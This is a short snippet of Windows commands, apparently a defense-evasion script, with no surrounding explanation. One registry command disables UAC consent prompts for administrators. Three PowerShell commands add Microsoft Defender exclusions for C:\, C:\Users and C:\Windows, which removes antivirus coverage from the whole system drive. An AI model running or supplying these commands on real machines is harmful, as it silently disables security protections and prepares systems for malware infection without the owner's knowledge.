reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f

powershell -Command Add-MpPreference -ExclusionPath "C:\Users"
powershell -Command Add-MpPreference -ExclusionPath "C:\"
powershell -Command Add-MpPreference -ExclusionPath "C:\Windows"
